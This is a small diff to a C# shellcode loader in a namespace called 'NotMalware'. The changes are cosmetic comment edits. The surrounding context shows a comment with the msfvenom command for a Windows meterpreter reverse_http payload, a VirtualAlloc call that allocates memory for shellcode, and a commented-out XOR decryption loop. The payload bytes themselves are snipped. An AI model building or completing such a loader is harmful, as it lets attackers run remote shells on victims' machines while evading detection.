@@ -23,7 +23,9 @@ namespace NotMalware
         {
             // Shellcode (msfvenom -p windows/x64/meterpreter/reverse_http LHOST=... LPORT=... -f csharp) for bitecode or XOR
             // byte[] buf = new byte[] {<SNIP>};
-            // For aes
+            
+            
+            // For AES
             // string bufEnc = "<SNIP>";  
 
                 
@@ -48,7 +50,7 @@ namespace NotMalware
             // Allocate RW space for shellcode
             IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (UInt32)buf.Length, 0x1000, 0x04);
 
-            // Decrypt shellcode if using XOR ENCRIPTION DEL SHELL CODE
+            // Decrypt shellcode if using XOR ENCRIPTION SHELLCODE
             // int i = 0;
             // while (i < buf.Length)
             // {
